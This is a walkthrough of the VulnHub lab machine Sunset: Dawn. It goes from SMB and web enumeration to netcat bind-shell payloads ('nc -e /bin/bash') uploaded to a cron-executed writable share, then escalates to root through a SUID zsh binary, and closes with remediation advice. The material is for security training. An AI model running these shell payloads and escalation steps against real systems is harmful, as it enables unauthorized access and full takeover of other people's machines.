# Sunset: Dawn — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.165 |
| **Difficulty** | Intermediate |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/sunset-dawn-vulnhub-walkthrough/) |

## Attack Summary

Sunset: Dawn is an intermediate-level VulnHub machine from the Sunset series. The attack chain begins with SMB enumeration that reveals a writable ITDEPT share whose contents are executed by a cron job every minute. Uploading a malicious script to that share yields a reverse shell as user `dawn`. Privilege escalation is achieved by exploiting the SUID bit set on `/usr/bin/zsh`.

## Methodology

1. Host discovery and port scanning
2. Web directory brute-force — discover exposed log file
3. Log analysis — discover cron-executed SMB share
4. SMB enumeration and writable share access
5. Malicious script upload via SMB
6. Cron job execution yields reverse shell
7. SUID binary (`zsh`) exploitation for root

## Step 1: Reconnaissance

```bash
netdiscover -r 192.168.1.0/24
```

Target identified at `192.168.1.165`.

```bash
nmap -A 192.168.1.165
```

![nmap](images/01-nmap.png)

**Open ports:**

| Port | Service |
|---|---|
| 80 | Apache httpd |
| 139 | NetBIOS-SSN |
| 445 | SMB |
| 3306 | MySQL |

## Step 2: Web and SMB Enumeration

Browsing to `http://192.168.1.165/` returned an unavailable error page. Directory brute-force with `dirb` revealed a `logs` directory:

```bash
dirb http://192.168.1.165/
```

![enumeration](images/02-enum.png)

Accessing `http://192.168.1.165/logs/management.log` revealed references to an `ITDEPT` directory containing two files: `product-control` and `web-control`. The log indicated these files are executed by a cron job approximately every minute.

SMB enumeration confirmed the ITDEPT share and identified two local users:

```bash
enum4linux -a 192.168.1.165
```

Users found: `dawn`, `ganimedes`

The ITDEPT SMB share was accessible without credentials:

```bash
smbclient //192.168.1.165/ITDEPT
```

The share was empty but writable.

## Step 3: Exploitation — Malicious Script Upload

Create two payloads that open netcat listeners:

```bash
echo "nc -e /bin/bash -lvp 1234 &" > product-control
echo "nc -e /bin/bash -lvp 1235 &" > web-control
```

Upload both files to the writable SMB share:

```bash
smbclient //192.168.1.165/ITDEPT
smb: \> put product-control
smb: \> put web-control
smb: \> ls
```

![exploit](images/03-exploit.png)

Wait approximately one minute for the cron job to execute the uploaded scripts.

## Step 4: Catching the Shell

```bash
nc 192.168.1.165 1234
```

![shell](images/04-shell.png)

Upgrade to a stable TTY shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Shell is running as user `dawn`.

## Step 5: Privilege Escalation — SUID zsh

Search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Notable finding: `/usr/bin/zsh` has the SUID bit set.

Execute `zsh` to inherit root privileges:

```bash
/usr/bin/zsh
whoami
# root
```

```bash
cd /root
cat flag.txt
```

![root flag](images/05-root-flag.png)

## Lessons Learned

- Cron jobs executing scripts from writable network shares are a critical attack surface. An attacker with write access to any share whose contents are executed by root can trivially achieve code execution.
- SUID bits on interactive shells (bash, zsh, sh) immediately grant privilege escalation with a single command. These should never be set.
- SMB shares should require authentication and enforce the principle of least privilege.

## Remediation

| Vulnerability | Fix |
|---|---|
| Writable SMB share executed by cron | Restrict share permissions; never execute scripts sourced from network shares as root |
| SUID bit on `/usr/bin/zsh` | Remove SUID: `chmod u-s /usr/bin/zsh` |
| Anonymous SMB access | Require authentication for all SMB shares |
| Exposed log files via HTTP | Restrict web server directory listing and sensitive log access |
